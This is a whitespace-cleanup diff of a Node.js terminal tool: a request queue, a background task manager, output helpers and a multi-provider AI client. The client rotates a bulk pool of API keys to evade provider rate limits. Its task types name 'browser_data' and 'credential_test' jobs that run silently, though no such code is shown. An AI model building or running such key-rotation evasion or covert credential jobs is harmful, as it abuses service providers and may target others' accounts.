                 request.status = 'processing';
                 request.keyIndex = keyIndex;
-                
+
                 // Execute request (don't await - process in background)
                 this.executeRequest(request, keyId)
                     .catch(err => {
                         BackgroundLogger?.log?.(`[Queue] Execute error: ${err.message}`, 'queue', 'ERROR');
                     });
-                
+
                 // Only process one per cycle to maintain fairness
                 break;
             }
@@ -2933,42 +2933,42 @@ const AIRequestQueue = {
             this.processing = false;
         }
     },
-    
+
     // === EXECUTE REQUEST ===
     async executeRequest(request, keyId) {
         const startTime = Date.now();
-        
+
         try {
             // Execute the actual request
             const result = await Promise.race([
                 request.executeFn(),
-                new Promise((_, reject) => 
+                new Promise((_, reject) =>
                     setTimeout(() => reject(new Error('Request timeout')), this.config.timeout)
                 )
             ]);
-            
+
             // Update stats
             const waitTime = startTime - request.timestamp;
             const processTime = Date.now() - startTime;
             this.stats.totalProcessed++;
             this.stats.lastProcessed = Date.now();
             this.stats.avgWaitTime = (this.stats.avgWaitTime * 0.9) + (waitTime * 0.1);
-            
+
             if (this.stats.byProvider[request.provider]) {
                 this.stats.byProvider[request.provider].processed++;
-                this.stats.byProvider[request.provider].avgTime = 
+                this.stats.byProvider[request.provider].avgTime =
                     (this.stats.byProvider[request.provider].avgTime * 0.9) + (processTime * 0.1);
             }
-            
+
             // Resolve the promise
             request.resolve(result);
-            
+
         } catch (error) {
             this.stats.totalFailed++;
             if (this.stats.byProvider[request.provider]) {
                 this.stats.byProvider[request.provider].failed++;
             }
-            
+
             // Check if rate limited
             if (error.message?.includes('Rate') || error.message?.includes('429')) {
                 // Mark key as rate limited in TerminalAI if available
@@ -2976,9 +2976,9 @@ const AIRequestQueue = {
                     TerminalAI.markKeyRateLimited?.(request.provider, 60000);
                 }
             }
-            
+
             request.reject(error);
-            
+
         } finally {
             // Release key after delay to prevent hammering
             setTimeout(() => {
@@ -2986,11 +2986,11 @@ const AIRequestQueue = {
             }, this.config.minDelayBetweenRequests);
         }
     },
-    
+
     // === GET STATUS ===
     getStatus() {
         const inFlightCount = Object.values(this.inFlight).filter(v => v).length;
-        
+
         return {
             enabled: this.enabled,
             queueLength: this.queue.length,
@@ -3001,48 +3001,48 @@ const AIRequestQueue = {
             byProvider: { ...this.stats.byProvider }
         };
     },
-    
+
     // === SHOW STATUS ===
     showStatus() {
         const status = this.getStatus();
-        
+
         console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.cyan}   📋 AI REQUEST QUEUE STATUS${C.reset}`);
         console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
-        
+
         console.log(`${C.bold}  Status:${C.reset} ${status.enabled ? C.green + 'ENABLED' : C.red + 'DISABLED'}${C.reset}`);
         console.log(`${C.bold}  Queued:${C.reset} ${status.queueLength} requests`);
         console.log(`${C.bold}  In-Flight:${C.reset} ${status.inFlight} requests`);
         console.log(`${C.bold}  Processed:${C.reset} ${status.totalProcessed}`);
         console.log(`${C.bold}  Failed:${C.reset} ${status.totalFailed}`);
         console.log(`${C.bold}  Avg Wait:${C.reset} ${status.avgWaitTime}ms`);
-        
+
         console.log(`\n${C.bold}  By Provider:${C.reset}`);
         Object.entries(status.byProvider).forEach(([provider, stats]) => {
             if (stats.processed > 0 || stats.queued > 0) {
                 console.log(`    ${provider.padEnd(12)} : ${stats.processed} processed, ${stats.failed} failed, ~${Math.round(stats.avgTime)}ms avg`);
             }
         });
-        
+
         // Show in-flight keys
         const activeKeys = Object.entries(this.inFlight).filter(([_, v]) => v).map(([k, _]) => k);
         if (activeKeys.length > 0) {
             console.log(`\n${C.bold}  Active Keys:${C.reset} ${activeKeys.join(', ')}`);
         }
-        
+
         console.log(`\n${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
     },
-    
+
     // === ENABLE/DISABLE ===
-    enable() { 
-        this.enabled = true; 
+    enable() {
+        this.enabled = true;
         console.log(`${C.green}✅ AI Request Queue ENABLED${C.reset}`);
     },
-    disable() { 
-        this.enabled = false; 
+    disable() {
+        this.enabled = false;
         console.log(`${C.yellow}⚠️ AI Request Queue DISABLED - requests bypass queue${C.reset}`);
     },
-    
+
     // === CLEAR QUEUE ===
     clear() {
         const count = this.queue.length;
@@ -3069,7 +3069,7 @@ const BackgroundTaskManager = {
         silentMode: true, // Don't print to main terminal
         showSummary: true // Show periodic summaries
     },
-    
+
     // === STATE ===
     tasks: new Map(),
     queue: [],
@@ -3078,7 +3078,7 @@ const BackgroundTaskManager = {
     failedCount: 0,
     lastSummaryTime: 0,
     summaryInterval: 30000, // 30 seconds
-    
+
     // === TASK TYPES ===
     TaskTypes: {
         BROWSER_DATA: 'browser_data',
@@ -3088,7 +3088,7 @@ const BackgroundTaskManager = {
         CREDENTIAL_TEST: 'credential_test',
         SCAN: 'scan'
     },
-    
+
     // === INITIALIZATION ===
     init() {
         // Create/clear log file
@@ -3102,28 +3102,28 @@ const BackgroundTaskManager = {
         fs.writeFileSync(this.config.logFile, header);
         this.bgLog('BackgroundTaskManager initialized', 'SYSTEM');
     },
-    
+
     // === BACKGROUND LOG (writes to file, not terminal) ===
     bgLog(message, taskType = 'GENERAL', level = 'INFO') {
         const ts = new Date().toISOString().split('T')[1].split('.')[0];
         const entry = `[${ts}] [${level}] [${taskType}] ${message}\n`;
-        
+
         try {
             fs.appendFileSync(this.config.logFile, entry);
         } catch (e) {
             // Silently fail
         }
-        
+
         // Only print critical errors to terminal
         if (level === 'CRITICAL' && !this.config.silentMode) {
             console.log(`${C.red}[BG] ${message}${C.reset}`);
         }
     },
-    
+
     // === ADD TASK TO QUEUE ===
     addTask(taskType, taskFn, options = {}) {
         const taskId = `${taskType}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
-        
+
         const task = {
             id: taskId,
             type: taskType,
@@ -3134,9 +3134,9 @@ const BackgroundTaskManager = {
             added: Date.now(),
             status: 'queued'
         };
-        
+
         this.tasks.set(taskId, task);
-        
+
         // Insert by priority
         const insertIndex = this.queue.findIndex(t => t.priority > task.priority);
         if (insertIndex === -1) {
@@ -3144,48 +3144,48 @@ const BackgroundTaskManager = {
         } else {
             this.queue.splice(insertIndex, 0, task);
         }
-        
+
         this.bgLog(`Task added: ${taskId}`, taskType);
-        
+
         // Process queue
         this.processQueue();
-        
+
         return taskId;
     },
-    
+
     // === PROCESS QUEUE ===
     async processQueue() {
         // Check if we can run more tasks
         if (this.running >= this.config.maxConcurrent || this.queue.length === 0) {
             return;
         }
-        
+
         // Get next task
         const task = this.queue.shift();
         if (!task) return;
-        
+
         this.running++;
         task.status = 'running';
         task.startTime = Date.now();
-        
+
         this.bgLog(`Task started: ${task.id}`, task.type);
-        
+
         try {
             // Execute task
             await task.fn();
-            
+
             task.status = 'completed';
             task.endTime = Date.now();
             this.completedCount++;
-            
+
             this.bgLog(`Task completed: ${task.id} (${task.endTime - task.startTime}ms)`, task.type);
         } catch (error) {
             task.status = 'failed';
             task.error = error.message;
             task.endTime = Date.now();
-            
+
             this.bgLog(`Task failed: ${task.id} - ${error.message}`, task.type, 'ERROR');
-            
+
             // Retry if possible
             if (task.retries < task.maxRetries) {
                 task.retries++;
@@ -3197,34 +3197,34 @@ const BackgroundTaskManager = {
             }
         } finally {
             this.running--;
-            
+
             // Show periodic summary
             this.maybeShowSummary();
-            
+
             // Process more tasks
             this.processQueue();
         }
     },
-    
+
     // === SHOW PERIODIC SUMMARY (minimal terminal output) ===
     maybeShowSummary() {
         const now = Date.now();
         if (!this.config.showSummary || now - this.lastSummaryTime < this.summaryInterval) {
             return;
         }
-        
+
         this.lastSummaryTime = now;
-        
+
         const pending = this.queue.length;
         const running = this.running;
         const total = this.completedCount + this.failedCount;
-        
+
         if (pending > 0 || running > 0) {
             // Minimal one-line status
             console.log(`${C.dim}[BG: ${running} running, ${pending} queued, ${total} done]${C.reset}`);
         }
     },
-    
+
     // === GET FULL STATUS ===
     getStatus() {
         const byType = {};
@@ -3232,7 +3232,7 @@ const BackgroundTaskManager = {
             if (!byType[task.type]) byType[task.type] = { completed: 0, failed: 0, running: 0, queued: 0 };
             byType[task.type][task.status]++;
         });
-        
+
         return {
             running: this.running,
             queued: this.queue.length,
@@ -3241,23 +3241,23 @@ const BackgroundTaskManager = {
             byType
         };
     },
-    
+
     // === SHOW DETAILED STATUS ===
     showStatus() {
         const status = this.getStatus();
-        
+
         console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.cyan}   🔄 BACKGROUND TASK MANAGER STATUS${C.reset}`);
         console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
-        
+
         console.log(`${C.green}  ✓ Completed: ${status.completed}${C.reset}`);
         console.log(`${C.yellow}  ⏳ Running: ${status.running}${C.reset}`);
         console.log(`${C.blue}  📋 Queued: ${status.queued}${C.reset}`);
         console.log(`${C.red}  ✗ Failed: ${status.failed}${C.reset}`);
-        
+
         console.log(`\n${C.dim}  📁 Log file: ${this.config.logFile}${C.reset}`);
         console.log(`${C.dim}  🔇 Silent mode: ${this.config.silentMode ? 'ON' : 'OFF'}${C.reset}`);
-        
+
         // By type breakdown
         if (Object.keys(status.byType).length > 0) {
             console.log(`\n${C.bold}  By Task Type:${C.reset}`);
@@ -3265,10 +3265,10 @@ const BackgroundTaskManager = {
                 console.log(`${C.dim}    ${type}: ${JSON.stringify(counts)}${C.reset}`);
             });
         }
-        
+
         console.log(`\n${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
     },
-    
+
     // === CLEAR COMPLETED TASKS ===
     clearCompleted() {
         let cleared = 0;
@@ -3281,21 +3281,21 @@ const BackgroundTaskManager = {
         this.bgLog(`Cleared ${cleared} completed/failed tasks`, 'SYSTEM');
         return cleared;
     },
-    
+
     // === TOGGLE SILENT MODE ===
     toggleSilent() {
         this.config.silentMode = !this.config.silentMode;
         const status = this.config.silentMode ? 'ON (background logs go to file)' : 'OFF (some logs shown in terminal)';
         log(`🔇 Background silent mode: ${status}`, 'cyan');
     },
-    
+
     // === VIEW RECENT LOGS ===
     viewLogs(lines = 20) {
         try {
             const content = fs.readFileSync(this.config.logFile, 'utf-8');
             const allLines = content.split('\n');
             const recentLines = allLines.slice(-lines);
-            
+
             console.log(`\n${C.bold}${C.cyan}   📋 Recent Background Logs (last ${lines} lines)${C.reset}\n`);
             recentLines.forEach(line => {
                 if (line.includes('[ERROR]')) {
@@ -3311,7 +3311,7 @@ const BackgroundTaskManager = {
             log('❌ Could not read background log file', 'red');
         }
     },
-    
+
     // === WRAP FUNCTION FOR BACKGROUND EXECUTION ===
     runInBackground(taskType, fn, options = {}) {
         return this.addTask(taskType, fn, options);
@@ -3335,16 +3335,16 @@ const OutputManager = {
     cleanMode: true,       // Clean output mode (suppress non-essential logs)
     spinnerInterval: null, // Animation interval
     currentSpinner: null,  // Current spinner message
-    
+
     // Spinner frames for animations
     spinnerFrames: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
     spinnerIndex: 0,
-    
+
     // === INITIALIZE WITH READLINE ===
     init(readlineInterface) {
         this.rl = readlineInterface;
     },
-    
+
     // === PAUSE READLINE FOR CLEAN OUTPUT ===
     pause() {
         if (this.rl && !this.isPaused) {
@@ -3353,7 +3353,7 @@ const OutputManager = {
             process.stdout.write('\r\x1b[K');
         }
     },
-    
+
     // === RESUME READLINE ===
     resume() {
         if (this.rl && this.isPaused) {
@@ -3362,114 +3362,114 @@ const OutputManager = {
             this.rl.prompt(true);
         }
     },
-    
+
     // === SMART LOG (queued, non-blocking) ===
     log(message, options = {}) {
         const { priority = 'normal', background = false, immediate = false } = options;
-        
+
         // Background tasks go to file only (unless critical)
         if (background && this.cleanMode && priority !== 'critical') {
             BackgroundTaskManager.bgLog(message.replace(/\x1b\[[0-9;]*m/g, ''), 'OUTPUT');
             return;
         }
-        
+
         // Immediate output
         if (immediate) {
             this._directOutput(message);
             return;
         }
-        
+
         // Queue for processing
         this.outputQueue.push({ message, priority });
         this._processQueue();
     },
-    
+
     // === DIRECT OUTPUT (pauses readline) ===
     _directOutput(message) {
         // Pause readline if active
         if (this.rl && !this.isPaused) {
             this.pause();
         }
-        
+
         // Output message
         console.log(message);
-        
+
         // Resume readline with small delay
         setTimeout(() => this.resume(), 50);
     },
-    
+
     // === PROCESS OUTPUT QUEUE ===
     async _processQueue() {
         if (this.isProcessing || this.outputQueue.length === 0) return;
-        
+
         this.isProcessing = true;
-        
+
         // Pause readline
         this.pause();
-        
+
         // Process all queued items
         while (this.outputQueue.length > 0) {
             const { message } = this.outputQueue.shift();
             console.log(message);
             await this._delay(10); // Small delay to prevent buffer overflow
         }
-        
+
         // Resume readline
         setTimeout(() => {
             this.resume();
             this.isProcessing = false;
         }, 100);
     },
-    
+
     // === CLI ANIMATION: SPINNER ===
     startSpinner(message, color = 'cyan') {
         this.stopSpinner();
         this.currentSpinner = message;
         this.spinnerIndex = 0;
-        
+
         this.spinnerInterval = setInterval(() => {
             const frame = this.spinnerFrames[this.spinnerIndex % this.spinnerFrames.length];
             this.spinnerIndex++;
             process.stdout.write(`\r${C[color] || C.cyan}${frame} ${message}${C.reset}   `);
         }, 80);
     },
-    
+
     // === STOP SPINNER ===
     stopSpinner(finalMessage = null, color = 'green') {
         if (this.spinnerInterval) {
             clearInterval(this.spinnerInterval);
             this.spinnerInterval = null;
-            
+
             // Clear spinner line
             process.stdout.write('\r\x1b[K');
-            
+
             // Show final message if provided
             if (finalMessage) {
                 console.log(`${C[color] || C.green}✓ ${finalMessage}${C.reset}`);
             }
         }
     },
-    
+
     // === PROGRESS BAR ===
     showProgress(current, total, label = 'Progress') {
         const width = 30;
         const percent = Math.round((current / total) * 100);
         const filled = Math.round((current / total) * width);
         const empty = width - filled;
-        
+
         const bar = `${C.green}${'█'.repeat(filled)}${C.dim}${'░'.repeat(empty)}${C.reset}`;
         process.stdout.write(`\r${C.cyan}${label}${C.reset} [${bar}] ${percent}% (${current}/${total})   `);
-        
+
         if (current >= total) {
             console.log(); // New line when complete
         }
     },
-    
+
     // === ANIMATED HEADER ===
     showAnimatedHeader(title, color = 'magenta') {
         const frames = ['◐', '◓', '◑', '◒'];
         let i = 0;
-        
+
         return new Promise(resolve => {
             const anim = setInterval(() => {
                 process.stdout.write(`\r ${C[color]}${frames[i % 4]} ${title}${C.reset}   `);
@@ -3482,7 +3482,7 @@ const OutputManager = {
             }, 100);
         });
     },
-    
+
     // === TYPE WRITER EFFECT ===
     async typeWriter(text, speed = 30, color = 'white') {
         for (const char of text) {
@@ -3491,13 +3491,13 @@ const OutputManager = {
         }
         console.log();
     },
-    
+
     // === TOGGLE CLEAN MODE ===
     toggleCleanMode() {
         this.cleanMode = !this.cleanMode;
         log(`🧹 Clean mode: ${this.cleanMode ? 'ON (background logs suppressed)' : 'OFF (all logs shown)'}`, 'cyan');
     },
-    
+
     // === HELPER ===
     _delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
@@ -3522,13 +3522,13 @@ const TerminalAI = {
         maxBackoffDelay: 60000,     // Max 60 second wait
         useSmartScheduling: true    // Spread requests to avoid limits
     },
-    
+
     conversationHistory: [],
     collaborationLog: [],    // Track AI-to-AI conversations
     browserAIContext: {},    // Context from browser AI
     pendingCollabTasks: [],  // Tasks waiting for browser AI response
     modelStats: {},          // Track which models work
-    
+
     // === EXPONENTIAL BACKOFF TRACKING ===
     backoffState: {
         currentDelay: 1000,    // Start with 1 second
@@ -3538,12 +3538,12 @@ const TerminalAI = {
         consecutiveRateLimits: 0,
         successfulRequests: 0
     },
-    
+
     // === REQUEST QUEUE SYSTEM ===
     requestQueue: [],
     isProcessingQueue: false,
     lastRequestTimestamp: 0,
-    
+
     // === FREE PROVIDERS (NO API KEY NEEDED) ===
     freeProviders: {
         // HuggingFace Inference API (rate limited but free)
@@ -3573,7 +3573,7 @@ const TerminalAI = {
             failures: 0
         }
     },
-    
+
     // === AI AVAILABILITY TRACKING ===
     aiAvailability: {
         isAvailable: true,
@@ -3583,19 +3583,19 @@ const TerminalAI = {
         pauseUntil: 0,
         maxConsecutiveFailures: 5,  // Pause AI operations after this many failures
         pauseDuration: 60000,       // Pause for 60 seconds when unavailable
-        
+
         // Check if AI should be paused
         shouldPause() {
             if (Date.now() < this.pauseUntil) return true;
             return this.consecutiveFailures >= this.maxConsecutiveFailures;
         },
-        
+
         // Record failure
         recordFailure() {
             this.consecutiveFailures++;
             this.totalFailuresInSession++;
             this.isAvailable = false;
-            
+
             if (this.consecutiveFailures >= this.maxConsecutiveFailures) {
                 this.pauseUntil = Date.now() + this.pauseDuration;
                 const pauseSec = Math.ceil(this.pauseDuration / 1000);
@@ -3603,14 +3603,14 @@ const TerminalAI = {
                 log(`   Run 'ai-reset' to force resume or wait...`, 'dim');
             }
         },
-        
+
         // Record success
         recordSuccess() {
             this.consecutiveFailures = 0;
             this.isAvailable = true;
             this.pauseUntil = 0;
         },
-        
+
         // Force reset
         reset() {
             this.consecutiveFailures = 0;
@@ -3619,7 +3619,7 @@ const TerminalAI = {
             this.totalFailuresInSession = 0;
             log('✅ AI availability reset', 'green');
         },
-        
+
         // Get status
         status() {
             return {
@@ -3631,7 +3631,7 @@ const TerminalAI = {
             };
         }
     },
-    
+
     // === MULTI-PROVIDER BACKUP SYSTEM ===
     backupKeys: {
         groq: null,      // FREE - https://console.groq.com
@@ -3641,7 +3641,7 @@ const TerminalAI = {
         mistral: null,   // Free tier - https://console.mistral.ai
         openrouter: null // Multi-model - https://openrouter.ai
     },
-    
+
     // ═══════════════════════════════════════════════════════════════════════════
     // 🔑 BULK API KEY POOL SYSTEM - NO MORE RATE LIMITING!
     // ═══════════════════════════════════════════════════════════════════════════
@@ -3655,7 +3655,7 @@ const TerminalAI = {
         openrouter: [], // Array of OpenRouter keys
         huggingface: [] // Array of HuggingFace tokens
     },
-    
+
     // Track current key index for each provider
     keyPoolIndex: {
         groq: 0,
@@ -3667,42 +3667,42 @@ const TerminalAI = {
         openrouter: 0,
         huggingface: 0
     },
-    
+
     // Track status of each key: 'active', 'rate_limited', 'dead', 'cooling'
     keyPoolStatus: {},
-    
+
     // Rate limit cooldown time (ms) - when key can be used again
     keyPoolCooldowns: {},
-    
+
     // Add key to pool
     addKeyToPool(provider, key) {
         provider = provider.toLowerCase();
         if (!this.keyPool[provider]) {
             this.keyPool[provider] = [];
         }
-        
+
         // Check if key already exists
         if (this.keyPool[provider].includes(key)) {
             log(`⚠️ Key already exists in ${provider} pool`, 'yellow');
             return false;
         }
-        
+
         this.keyPool[provider].push(key);
         const keyId = `${provider}_${this.keyPool[provider].length - 1}`;
         this.keyPoolStatus[keyId] = 'active';
         this.keyPoolCooldowns[keyId] = 0;
-        
+
         log(`✅ Key added to ${provider.toUpperCase()} pool (Total: ${this.keyPool[provider].length} keys)`, 'green');
-        
+
         // If this is the first key for this provider, also set it as backup
         if (this.keyPool[provider].length === 1 && this.backupKeys.hasOwnProperty(provider)) {
             this.backupKeys[provider] = key;
             log(`   Also set as primary ${provider} backup`, 'cyan');
         }
-        
+
         return true;
     },
-    
+
     // Add multiple keys at once
     addKeysToPool(provider, keys) {
         provider = provider.toLowerCase();
@@ -3717,96 +3717,96 @@ const TerminalAI = {
         log(`✅ Added ${added} keys to ${provider.toUpperCase()} pool`, 'green');
         return added;
     },
-    
+
     // Get next available key (auto-rotate on rate limit)
     getNextKey(provider) {
         provider = provider.toLowerCase();
         const pool = this.keyPool[provider];
-        
+
         if (!pool || pool.length === 0) {
             return this.backupKeys[provider] || null;
         }
-        
+
         const now = Date.now();
         const startIndex = this.keyPoolIndex[provider];
         let attempts = 0;
-        
+
         // Try to find an available key
         while (attempts < pool.length) {
             const idx = (startIndex + attempts) % pool.length;
             const keyId = `${provider}_${idx}`;
             const status = this.keyPoolStatus[keyId];
             const cooldown = this.keyPoolCooldowns[keyId] || 0;
-            
+
             // Check if key is available
             if (status === 'active' || (status === 'cooling' && now > cooldown)) {
                 this.keyPoolIndex[provider] = idx;
                 this.keyPoolStatus[keyId] = 'active';
                 return pool[idx];
             }
-            
+
             // Skip dead keys
             if (status === 'dead') {
                 attempts++;
                 continue;
             }
-            
+
             // Skip rate limited keys still in cooldown
             if (status === 'rate_limited' && now < cooldown) {
                 attempts++;
                 continue;
             }
-            
+
             // Key was rate limited but cooldown passed
             if (status === 'rate_limited' && now >= cooldown) {
                 this.keyPoolStatus[keyId] = 'active';
                 this.keyPoolIndex[provider] = idx;
                 return pool[idx];
             }
-            
+
             attempts++;
         }
-        
+
         // All keys exhausted, return null
         log(`⚠️ All ${provider.toUpperCase()} keys are rate limited or dead!`, 'red');
         return null;
     },
-    
+
     // Mark current key as rate limited and rotate to next
     markKeyRateLimited(provider, cooldownMs = 60000) {
         provider = provider.toLowerCase();
         const pool = this.keyPool[provider];
-        
+
         if (!pool || pool.length === 0) {
             return null;
         }
-        
+
         const currentIdx = this.keyPoolIndex[provider];
         const keyId = `${provider}_${currentIdx}`;
-        
+
         this.keyPoolStatus[keyId] = 'rate_limited';
         this.keyPoolCooldowns[keyId] = Date.now() + cooldownMs;
-        
+
         const cooldownSec = Math.ceil(cooldownMs / 1000);
         log(`⏳ Key ${currentIdx + 1}/${pool.length} rate limited (cooldown: ${cooldownSec}s)`, 'yellow');
-        
+
         // Try to get next key
         this.keyPoolIndex[provider] = (currentIdx + 1) % pool.length;
         const nextKey = this.getNextKey(provider);
-        
+
         if (nextKey) {
             const newIdx = this.keyPoolIndex[provider];
             log(`🔄 Rotated to key ${newIdx + 1}/${pool.length}`, 'cyan');
-            
+
             // Update backup too
             if (this.backupKeys.hasOwnProperty(provider)) {
                 this.backupKeys[provider] = nextKey;
             }
         }
-        
+
         return nextKey;
     },
-    
+
     // Mark key as dead (invalid/revoked)
     markKeyDead(provider, index) {
         provider = provider.toLowerCase();
@@ -3814,19 +3814,19 @@ const TerminalAI = {
         this.keyPoolStatus[keyId] = 'dead';
         log(`💀 Key ${index + 1} marked as dead`, 'red');
     },
-    
+
     // Remove key from pool
     removeKeyFromPool(provider, index) {
         provider = provider.toLowerCase();
         const pool = this.keyPool[provider];
-        
+
         if (!pool || index < 0 || index >= pool.length) {
             log(`⚠️ Invalid key index`, 'yellow');
             return false;
         }
-        
+
         pool.splice(index, 1);
-        
+
         // Rebuild status for remaining keys
         const newStatus = {};
         const newCooldowns = {};
@@ -3836,7 +3836,7 @@ const TerminalAI = {
             newStatus[newId] = this.keyPoolStatus[oldId] || 'active';
             newCooldowns[newId] = this.keyPoolCooldowns[oldId] || 0;
         });
-        
+
         // Update status
         Object.keys(this.keyPoolStatus).forEach(k => {
             if (k.startsWith(provider + '_')) delete this.keyPoolStatus[k];
@@ -3846,25 +3846,25 @@ const TerminalAI = {
         });
         Object.assign(this.keyPoolStatus, newStatus);
         Object.assign(this.keyPoolCooldowns, newCooldowns);
-        
+
         // Reset index if needed
         if (this.keyPoolIndex[provider] >= pool.length) {
             this.keyPoolIndex[provider] = 0;
         }
-        
+
         log(`✅ Key removed from ${provider.toUpperCase()} pool (${pool.length} remaining)`, 'green');
         return true;
     },
-    
+
     // Clear all dead keys
     clearDeadKeys(provider = null) {
         const providers = provider ? [provider.toLowerCase()] : Object.keys(this.keyPool);
         let removed = 0;
-        
+
         providers.forEach(p => {
             const pool = this.keyPool[p];
             if (!pool) return;
-            
+
             // Find dead keys (reverse order to maintain indices)
             for (let i = pool.length - 1; i >= 0; i--) {
                 const keyId = `${p}_${i}`;
@@ -3874,38 +3874,38 @@ const TerminalAI = {
                 }
             }
         });
-        
+
         log(`🧹 Removed ${removed} dead keys`, 'green');
         return removed;
     },
-    
+
     // Show key pool status
     showKeyPool() {
         console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.cyan}   🔑 API KEY POOL STATUS (Bulk Rate Limit Protection)${C.reset}`);
         console.log(`${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
-        
+
         const now = Date.now();
         let totalKeys = 0;
         let activeKeys = 0;
-        
+
         Object.keys(this.keyPool).forEach(provider => {
             const pool = this.keyPool[provider];
             if (pool.length === 0) return;
-            
+
             totalKeys += pool.length;
             const currentIdx = this.keyPoolIndex[provider];
-            
+
             console.log(`${C.yellow}${C.bold}${provider.toUpperCase()} (${pool.length} keys):${C.reset}`);
-            
+
             pool.forEach((key, i) => {
                 const keyId = `${provider}_${i}`;
                 const status = this.keyPoolStatus[keyId] || 'active';
                 const cooldown = this.keyPoolCooldowns[keyId] || 0;
                 const isCurrent = i === currentIdx;
-                
+
                 let statusIcon, statusColor;
-                switch(status) {
+                switch (status) {
                     case 'active':
                         statusIcon = '🟢';
                         statusColor = C.green;
@@ -3929,15 +3929,15 @@ const TerminalAI = {
                         statusIcon = '⚪';
                         statusColor = C.dim;
                 }
-                
+
                 const currentMarker = isCurrent ? `${C.cyan}→ ${C.reset}` : '  ';
                 const keyPreview = key.substring(0, 15) + '...' + key.slice(-4);
-                
+
                 console.log(`${currentMarker}${statusColor}[${i + 1}] ${statusIcon} ${keyPreview}${C.reset}`);
             });
             console.log();
         });
-        
+
         if (totalKeys === 0) {
             console.log(`${C.dim}  No keys in pool. Add keys with:${C.reset}`);
             console.log(`${C.cyan}  addkey groq gsk_xxxxxxxxxx${C.reset}`);
@@ -3946,10 +3946,10 @@ const TerminalAI = {
         } else {
             console.log(`${C.bold}Total: ${totalKeys} keys | Active: ${activeKeys} | Rate Limited: ${totalKeys - activeKeys}${C.reset}`);
         }
-        
+
         console.log();
     },
-    
+
     // Save key pool to file
     saveKeyPool() {
         try {
@@ -3959,11 +3959,11 @@ const TerminalAI = {
             };
             fs.writeFileSync('nexus-keypool.json', JSON.stringify(data, null, 2));
             log('💾 Key pool saved to nexus-keypool.json', 'green');
-        } catch(e) {
+        } catch (e) {
             log(`⚠️ Failed to save key pool: ${e.message}`, 'yellow');
         }
     },
-    
+
     // Load key pool from file
     loadKeyPool() {
         try {
@@ -3983,35 +3983,35 @@ const TerminalAI = {
                 if (data.keyPoolIndex) {
                     Object.assign(this.keyPoolIndex, data.keyPoolIndex);
                 }
-                
+
                 const totalKeys = Object.values(this.keyPool).reduce((sum, arr) => sum + arr.length, 0);
                 if (totalKeys > 0) {
                     log(`📂 Loaded ${totalKeys} keys from nexus-keypool.json`, 'green');
                 }
             }
-        } catch(e) {
+        } catch (e) {
             log(`⚠️ Failed to load key pool: ${e.message}`, 'yellow');
         }
     },
-    
+
     // Provider fallback order (prioritize free providers first!)
     fallbackOrder: ['huggingface', 'together', 'deepseek', 'groq', 'mistral', 'openrouter', 'openai'],
-    
+
     // Track provider status
     providerFailures: {},
     providerRateLimits: {},
-    
+
     // Response cache
     responseCache: new Map(),
     cacheMaxAge: 5 * 60 * 1000,  // 5 minutes
-    
+
     // === EXPONENTIAL BACKOFF METHODS ===
     resetBackoff() {
         this.backoffState.currentDelay = 1000;
         this.backoffState.consecutiveRateLimits = 0;
         this.backoffState.successfulRequests++;
     },
-    
+
     increaseBackoff() {
         this.backoffState.consecutiveRateLimits++;
         this.backoffState.currentDelay = Math.min(
@@ -4020,22 +4020,22 @@ const TerminalAI = {
         );
         this.backoffState.lastRateLimit = Date.now();
     },
-    
+
     async applyBackoff(reason = 'rate_limit') {
         const delay = this.backoffState.currentDelay;
         const jitter = Math.random() * 1000; // Add random jitter
         const totalDelay = delay + jitter;
-        
-        log(`⏳ Backoff: waiting ${Math.ceil(totalDelay/1000)}s (attempt ${this.backoffState.consecutiveRateLimits + 1})...`, 'yellow');
+
+        log(`⏳ Backoff: waiting ${Math.ceil(totalDelay / 1000)}s (attempt ${this.backoffState.consecutiveRateLimits + 1})...`, 'yellow');
         await this.delay(totalDelay);
-        
+
         this.increaseBackoff();
     },
-    
+
     // === FREE HUGGINGFACE PROVIDER ===
     async queryHuggingFace(prompt) {
         const hf = this.freeProviders.huggingface;
-        
+
         // Check if rate limited
         if (Date.now() < hf.rateLimitReset) {
             const waitSec = Math.ceil((hf.rateLimitReset - Date.now()) / 1000);
@@ -4045,7 +4045,7 @@ const TerminalAI = {
             }
             return null;
         }
-        
+
         // Disable after too many consecutive failures
         if (hf.consecutiveFailures >= 15) {
             // Only log once per minute
@@ -4054,12 +4054,12 @@ const TerminalAI = {
             }
             return null;
         }
-        
+
         // Try each model
         for (const model of hf.models) {
             try {
                 const modelName = model.split('/').pop();
-                
+
                 // Build headers
                 const headers = {
                     'Content-Type': 'application/json'
@@ -4067,7 +4067,7 @@ const TerminalAI = {
                 if (hf.token) {
                     headers['Authorization'] = `Bearer ${hf.token}`;
                 }
-                
+
                 // Different models need different request formats
                 let requestBody;
                 if (model.includes('flan-t5') || model.includes('bloom')) {
@@ -4091,7 +4091,7 @@ const TerminalAI = {
                         }
                     });
                 }
-                
+
                 const result = await this._makeHTTPRequest({
                     hostname: 'api-inference.huggingface.co',
                     path: `/models/${model}`,
@@ -4099,11 +4099,11 @@ const TerminalAI = {
                     headers: headers,
                     timeout: 15000  // 15 second timeout
                 }, requestBody);
-                
+
                 // Success cases
                 if (result && !result.error && !result.rateLimited) {
                     let text = null;
-                    
+
                     // Parse different response formats
                     if (Array.isArray(result) && result[0]?.generated_text) {
                         text = result[0].generated_text;
@@ -4114,7 +4114,7 @@ const TerminalAI = {
                     } else if (typeof result === 'string' && result.length > 10) {
                         text = result;
                     }
-                    
+
                     if (text && text.length > 20) {
                         hf.consecutiveFailures = 0;
                         hf.lastSuccess = Date.now();
@@ -4123,28 +4123,28 @@ const TerminalAI = {
                         return text;
                     }
                 }
-                
+
                 // Rate limited
                 if (result?.rateLimited || result?.statusCode === 429) {
